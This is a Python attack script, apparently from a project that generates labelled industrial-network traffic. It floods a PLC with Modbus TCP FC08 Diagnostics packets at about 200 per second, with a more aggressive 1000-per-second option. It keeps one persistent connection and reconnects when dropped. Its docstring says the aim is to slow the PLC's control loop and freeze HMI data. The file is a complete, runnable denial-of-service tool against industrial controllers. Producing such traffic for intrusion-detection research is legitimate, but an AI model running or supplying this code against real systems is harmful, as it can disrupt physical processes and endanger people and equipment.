"""
Attack #3: Diagnostic_Flood_FC08 (Diagnostics Query Flood)
==================================================================
Target register: none - raw Modbus TCP connection to the PLC listener
Technique: Sends hundreds of Modbus FC08 (Diagnostics) packets per second
           to the PLC.
Effect: The PLC CPU stays busy generating diagnostic responses, slowing
        down the real-time control loop and freezing HMI data.
MITRE ATT&CK for ICS: T0814 - Denial of Service
"""

import time
import socket
import struct
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    LABEL_DIAG_FLOOD
)


# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
FLOOD_DELAY = 0.005      # send a packet every 5ms (~200 pkt/s)
                         # more aggressive setting: 0.001 (1000 pkt/s)

ATTACK_NAME = "Diagnostic_Flood_FC08"
ATTACK_ID   = LABEL_DIAG_FLOOD


def _build_fc08_packet(transaction_id=1):
    """
    Builds a Modbus TCP FC08 (Diagnostics) packet.

    MBAP header (7 bytes):
      - Transaction ID (2 bytes)
      - Protocol ID (2 bytes = 0x0000)
      - Length (2 bytes)
      - Unit ID (1 byte)
    PDU (3 bytes):
      - Function Code: 0x08 (Diagnostics)
      - Sub-function: 0x0000 (Return Query Data)
      - Data: 0x0000
    """
    mbap = struct.pack('>HHHB',
        transaction_id,   # Transaction ID
        0x0000,           # Protocol ID (Modbus)
        0x0006,           # Length (Unit ID + FC + Sub-function + Data = 6 bytes)
        UNIT_ID           # Unit ID
    )
    pdu = struct.pack('>BHH',
        0x08,             # Function Code 8 (Diagnostics)
        0x0000,           # Sub-function: Return Query Data
        0x0000            # Data
    )
    return mbap + pdu


def run_attack(duration_sec=600, label_manager=None):
    """
    Runs the FC08 diagnostics flood attack.

    Instead of opening a new TCP connection for every packet, packets are
    sent rapidly over a single persistent connection (more effective).
    """
    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT}")
    print(f"  Method: FC08 Diagnostics Flood ({1/FLOOD_DELAY:.0f} pkt/s)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"Rate={1/FLOOD_DELAY:.0f} pkt/s"
        )

    start_time = time.time()
    packet_count = 0
    error_count = 0
    reconnect_count = 0

    sock = None

    try:
        while (time.time() - start_time) < duration_sec:
            # Reconnect if there is no socket or it was dropped
            if sock is None:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((PLC_IP, PLC_PORT))
                    reconnect_count += 1
                except Exception as e:
                    print(f"  [FLOOD] Connection error: {e}")
                    sock = None
                    time.sleep(1)
                    continue

            try:
                # Send the FC08 packet
                pkt = _build_fc08_packet(packet_count % 65535)
                sock.sendall(pkt)
                packet_count += 1

                # Try to read the response (to keep the PLC's CPU occupied)
                try:
                    sock.recv(256)
                except socket.timeout:
                    pass  # Timeout = PLC is busy -> attack is working!

                if packet_count % 500 == 0:
                    elapsed = time.time() - start_time
                    rate = packet_count / elapsed if elapsed > 0 else 0
                    remaining = duration_sec - elapsed
                    print(f"  [FLOOD] {packet_count} packets | "
                          f"{rate:.0f} pkt/s | errors: {error_count} | "
                          f"remaining: {remaining:.0f}s")

            except (BrokenPipeError, ConnectionResetError, OSError):
                error_count += 1
                sock.close()
                sock = None

            time.sleep(FLOOD_DELAY)

    except KeyboardInterrupt:
        print("\n  [FLOOD] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        if sock:
            sock.close()

        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} packets, {error_count} errors, {elapsed:.1f}s"
            )

        rate = packet_count / elapsed if elapsed > 0 else 0
        print(f"\n  [FLOOD] Finished: {packet_count} packets ({rate:.0f} pkt/s), "
              f"{error_count} errors, {reconnect_count} reconnects")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
